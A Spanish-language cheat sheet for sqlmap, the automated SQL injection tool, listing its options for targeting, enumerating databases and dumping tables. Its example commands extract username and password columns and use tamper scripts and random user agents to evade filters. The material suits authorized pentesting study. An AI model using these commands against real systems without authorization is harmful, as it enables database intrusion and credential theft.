## 📘 ¿Qué es SQLMap?
- **sqlmap** es una herramienta automática para **detectar y explotar vulnerabilidades SQL Injection**.
- Soporta múltiples motores: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.
- Muy usada en **pentesting web** y **laboratorios académicos**.

---

## 🚀 Uso básico
```bash
sqlmap -u "http://target.com/page.php?id=1"

    -u → URL vulnerable con parámetro
	```

## 📥 Input / Request

| Parámetro   | Para qué sirve                    |
| ----------- | --------------------------------- |
| `-u`        | URL objetivo                      |
| `-r`        | Usar request HTTP guardado (Burp) |
| `--data`    | Inyección por POST                |
| `-p`        | Parámetro específico a testear    |
| `--cookie`  | Enviar cookies                    |
| `--headers` | Headers personalizados            |
Ejemplo:
`sqlmap -r request.req -p id`

## Detección y técnicas

| Parámetro            | Función                         |
| -------------------- | ------------------------------- |
| `--batch`            | Modo automático (sin preguntas) |
| `--dbs`              | Enumerar bases de datos         |
| `--tables`           | Enumerar tablas                 |
| `--columns`          | Enumerar columnas               |
| `--dump`             | Volcar datos                    |
| `--technique=BEUSTQ` | Elegir técnicas de inyección    |
## 🗄️ Extracción de datos

| Parámetro | Uso               |
| --------- | ----------------- |
| `-D`      | Base de datos     |
| `-T`      | Tabla             |
| `-C`      | Columnas          |
| `--dump`  | Extraer contenido |
Ejemplo clásico:

`sqlmap -D sqltraining -T users -C username,password --dump`

## ⚙️ Nivel y riesgo

Controlan **qué tan agresivo** es sqlmap.

|Parámetro|Descripción|
|---|---|
|`--level=1-5`|Cantidad de tests|
|`--risk=1-3`|Riesgo de los payloads|

Ejemplo:

`sqlmap -u URL --level=5 --risk=3`
## 🔐 Bypass y evasión

|Parámetro|Uso|
|---|---|
|`--tamper=script`|Ofuscar payloads|
|`--random-agent`|User-Agent aleatorio|
|`--threads`|Velocidad|

---

## 🧪 Scripts tamper más comunes

|Script|Para qué sirve|
|---|---|
|`space2comment`|Reemplaza espacios por comentarios|
|`between`|Usa BETWEEN en payloads|
|`charencode`|Codifica caracteres|
|`randomcase`|Cambia mayúsculas/minúsculas|
|`equaltolike`|Usa LIKE en vez de `=`|

Ejemplo:

`sqlmap -u URL --tamper=space2comment,randomcase`